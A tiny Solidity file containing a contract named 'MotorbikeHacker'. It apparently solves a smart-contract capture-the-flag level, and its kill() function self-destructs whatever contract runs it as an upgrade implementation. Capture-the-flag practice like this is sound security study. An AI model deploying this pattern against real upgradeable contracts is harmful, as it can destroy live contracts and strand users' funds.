// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract MotorbikeHacker {
  function kill() external {
    selfdestruct(address(0));
  }
}
